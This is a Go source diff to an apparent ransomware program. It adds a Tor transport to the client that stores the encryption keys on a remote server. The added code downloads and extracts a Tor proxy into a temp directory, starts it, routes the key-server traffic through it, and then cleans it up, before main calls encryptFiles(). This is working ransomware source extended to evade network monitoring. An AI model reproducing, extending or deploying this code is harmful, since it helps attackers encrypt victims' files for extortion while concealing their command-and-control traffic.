@@ -8,6 +8,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
+	"log"
 	"os"
 	"path/filepath"
 	"strings"
@@ -17,10 +18,14 @@ import (
 	"github.com/mauri870/ransomware/client"
 	"github.com/mauri870/ransomware/cmd"
 	"github.com/mauri870/ransomware/cryptofs"
+	"github.com/mauri870/ransomware/tor"
 	"github.com/mauri870/ransomware/utils"
 )
 
 var (
+	// If the program should use the tor proxy to contact the server
+	UseTor string
+
 	// Time to keep trying persist new keys on server
 	SecondsToTimeout = 5.0
 
@@ -55,10 +60,34 @@ func main() {
 	pubkey, err := Asset("public.pem")
 	if err != nil {
 		cmd.Logger.Println(err)
+		return
 	}
 
 	// http client instance
 	Client = client.New(ServerBaseURL, pubkey)
+
+	if UseTor == "true" {
+		cmd.Logger.Println("Tor transport enabled")
+		err = Client.UseTorTransport()
+		if err != nil {
+			cmd.Logger.Println(err)
+			return
+		}
+
+		cmd.Logger.Println("Downloading the proxy")
+		torProxy := tor.New(cmd.TempDir)
+		torProxy.DownloadAndExtract()
+
+		cmd.Logger.Println("Waiting tor bootstrap to complete")
+		torProxy.Start()
+		cmd.Logger.Println("Tor is now live")
+
+		defer func() {
+			log.Println("Shutting down Tor and running cleanup")
+			torProxy.Kill()
+			torProxy.Clean()
+		}()
+	}
 
 	// Hannibal ad portas
 	encryptFiles()
